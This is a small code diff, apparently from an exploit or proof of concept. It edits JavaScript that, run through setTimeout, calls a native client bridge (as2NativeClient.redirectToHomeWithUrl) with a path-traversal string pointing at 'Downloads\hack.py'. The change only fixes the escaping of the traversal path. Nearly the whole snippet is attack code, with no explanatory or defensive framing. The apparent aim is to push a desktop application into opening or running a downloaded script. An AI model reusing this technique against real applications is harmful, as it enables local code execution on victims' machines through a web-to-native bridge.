@@ -16,7 +16,7 @@ setTimeout(`
         .then((result) => {
           if(window.as2NativeClient) {
   
-                        window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
+                        window.as2NativeClient.redirectToHomeWithUrl("..\\\\..\\\\..\\\\..\\\\Downloads\\\\hack.py")
 
          }
         })
